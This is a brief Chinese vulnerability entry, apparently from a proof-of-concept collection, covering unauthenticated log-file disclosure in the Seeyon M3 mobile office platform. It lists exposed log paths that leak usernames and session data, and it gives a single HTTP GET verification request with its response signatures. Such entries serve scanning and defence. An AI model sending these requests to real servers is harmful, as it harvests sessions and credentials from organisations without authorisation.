﻿# 致远M3移动智能办公平台 mobile_portal 信息泄露

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：致远OA移动智能办公平台mobile_portal接口处存在敏感信息泄露漏洞，未授权访问的日志文件泄露数据包括用户名、session和系统接口信息等，恶意攻击者可能利用该敏感信息对服务器进行进一步的攻击，从容团队服务器造成危害。/mobile_portal/logs/autoLogin.log /mobile_portal/logs/app.log /mobile_portal/logs/requset.log

> 漏洞特征：

> 验证脚本：HTTP

```
GET /mobile_portal/logs/autoLogin.log HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：Login

> 上传文件定位：

> 验证文件来源：致远M3移动智能办公平台 mobile_portal 信息泄露.poc

